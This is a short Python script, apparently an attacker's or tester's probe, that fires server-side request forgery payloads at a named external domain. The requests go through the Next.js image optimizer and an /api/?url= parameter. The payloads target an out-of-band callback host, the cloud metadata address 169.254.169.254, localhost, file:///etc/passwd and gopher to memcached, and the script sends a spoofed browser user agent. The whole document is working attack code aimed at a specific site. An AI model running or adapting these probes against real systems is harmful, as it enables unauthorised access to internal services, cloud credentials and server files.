import requests, urllib.parse, time
T = "https://www" + ".infinitycapital" + ".bh"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
DOM = open("/tmp/dom.txt").read().strip()
H = "oobecdf21ccb4b1." + DOM
s = requests.Session(); s.headers.update({"User-Agent": UA})

def hit(label, path):
    try:
        r = s.get(T + path, timeout=25, allow_redirects=False)
        print(f"[{label}] {r.status_code} len={len(r.content)} ct={r.headers.get('content-type','-')}")
    except Exception as e:
        print(f"[{label}] EXC {e}")

# SSRF candidates through the Next.js image optimizer (server-side fetch)
hit("oob-url",  "/_next/image?url=" + urllib.parse.quote("http://" + H + "/ssrf-nextimg") + "&w=640&q=75")
hit("oob-plain","/_next/image?url=" + urllib.parse.quote("http://" + H + "/ssrf-plain") + "&w=640&q=75")
hit("meta-data","/_next/image?url=" + urllib.parse.quote("http://169.254.169.254/latest/meta-data/") + "&w=640&q=75")
hit("internal",  "/_next/image?url=" + urllib.parse.quote("http://127.0.0.1:80/") + "&w=640&q=75")
hit("file-proto", "/_next/image?url=" + urllib.parse.quote("file:///etc/passwd") + "&w=640&q=75")
hit("gopher",    "/_next/image?url=" + urllib.parse.quote("gopher://127.0.0.1:11211/_stats") + "&w=640&q=75")
# plain /api/ url param SSRF
hit("api-url",   "/api/?url=" + urllib.parse.quote("http://" + H + "/ssrf-api"))
